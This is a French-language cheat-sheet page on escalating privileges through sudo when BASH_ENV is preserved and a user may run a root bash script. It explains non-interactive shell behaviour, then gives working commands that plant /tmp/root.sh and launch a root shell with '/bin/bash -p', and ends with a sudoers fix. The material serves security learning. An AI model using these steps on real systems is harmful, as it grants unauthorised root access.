# PATH HIJACK BASH\_ENV

***

* **Sudo** est configuré pour permettre à un utilisateur (`hish`) d’exécuter un script root (`/usr/bin/systeminfo`).
* Le script `/usr/bin/systeminfo` est un **script bash** lancé avec sudo, qui exécute plusieurs commandes système (`dmesg`, `ss`, `mount`).
* **Sudo autorise la préservation de la variable d’environnement `BASH_ENV`** (`env_keep+="BASH_ENV"`).
* Le script s’exécute en **shell non interactif**, ce qui a une importance capitale.

***

### <mark style="color:red;">Concepts clés</mark>

#### Shell interactif vs non interactif

* **Interactif** : Utilisateur tape les commandes en direct dans un terminal (bash charge `~/.bashrc`).
* **Non interactif** : Bash exécute un script ou une commande sans interaction (bash ne charge pas par défaut `~/.bashrc`).

#### Rôle de `BASH_ENV`

* En mode **non interactif**, bash cherche à charger le fichier pointé par la variable d’environnement `BASH_ENV`.
* Cela permet d’exécuter un script avant la commande principale, même en mode non interactif.

***

* `sudo` ne nettoie **pas** la variable `BASH_ENV` avant d’exécuter le script en root.
* Le script root est un bash script qui appelle des commandes systèmes.
* Tu peux forcer bash (lancé par sudo) à exécuter ton script malicieux via `BASH_ENV`.
* Ainsi, tu peux injecter du code qui s’exécute en root.

***

### <mark style="color:red;">Exemple d’exploitation</mark>

1. Crée un script malicieux `/tmp/root.sh` :

```bash
echo 'echo "BASH_ENV sourced as root!"; id; /bin/bash -p' > /tmp/root.sh
chmod +x /tmp/root.sh
```

Contenu :

```bash
echo "BASH_ENV sourced as root!"
id              # affiche l’UID pour prouver l’élévation
/bin/bash -p    # lance un shell root interactif en mode « privileged »
```

2. Lance le script root avec `sudo` en forçant la variable `BASH_ENV` :

```bash
env -i BASH_ENV=/tmp/root.sh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin sudo /usr/bin/systeminfo
```

* `env -i` : lance un environnement propre, pour éviter que d’autres variables ne perturbent.
* `BASH_ENV=/tmp/root.sh` : force bash à charger ton script malicieux.
* `PATH` est remis à la valeur par défaut pour que les commandes système fonctionnent.
* `sudo /usr/bin/systeminfo` exécute le script en root, qui lance bash non interactif, donc exécute `BASH_ENV`.

***

* **Désactiver la préservation de `BASH_ENV`** dans sudoers : `env_keep -= "BASH_ENV"`

***
